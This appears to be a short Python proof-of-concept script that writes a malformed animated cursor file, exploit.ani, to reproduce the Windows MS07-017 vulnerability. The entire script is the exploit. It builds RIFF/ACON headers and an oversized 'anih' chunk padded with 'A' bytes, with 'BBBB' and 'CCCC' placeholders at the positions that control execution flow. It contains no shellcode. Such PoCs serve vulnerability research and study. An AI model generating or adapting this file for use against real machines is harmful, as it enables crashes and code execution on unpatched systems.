#!/usr/bin/env python3
# Script to generate PoC ANI file to reproduce MS07-017
# Author: Prashant Kumar (@notsoshant)

poc  = b"\x52\x49\x46\x46" + b"\x90\x00\x00\x00" + b"\x41\x43\x4f\x4e" + b"\x61\x6e\x69\x68"
poc += b"\x24\x00\x00\x00" + b"\x24\x00\x00\x00" + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00"
poc += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
poc += b"\x00\x00\x00\x00" + b"\x01\x00\x00\x00" + b"\x61\x6E\x69\x68" + b"\x58\x00\x00\x00"
poc += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
poc += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
poc += b"\x00\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
poc += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x00\x00\x00\x00"
poc += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
poc += b"\x42\x42\x42\x42" + b"\x43\x43\x43\x43"

f = open('exploit.ani','w+b')
f.write(poc)
f.close()